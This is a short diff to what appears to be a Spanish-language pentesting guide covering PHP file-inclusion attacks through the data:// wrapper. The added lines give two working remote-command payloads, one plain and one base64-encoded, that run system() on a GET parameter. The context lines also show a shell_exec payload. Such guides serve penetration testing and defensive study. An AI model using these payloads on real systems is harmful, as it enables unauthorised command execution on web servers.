@@ -2411,6 +2411,18 @@ http://example.com/index.php?file=data:text/plain;,<?php echo shell_exec($_GET['
 
 Otro payload interesante a tener en cuenta es el `<?php phpinfo(); die();?>`. La funcionalidad **die** previene la ejecución del resto del script o la ejecución de la extensión decodificada incorrectamente anexada a la secuencia.
 
+Para ejecutar en ambos casos directamente un comando, la solicitud de datos + carga útil puede ser:
+
+```bash
+http://example.com/index.php?file=data:,<?system($_GET['x']);?>&x=ls
+```
+
+O también:
+
+```bash
+http://example.com/index.php?file=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&x=ls.
+```
+
 ##### Wrapper expect://
 
 ```bash
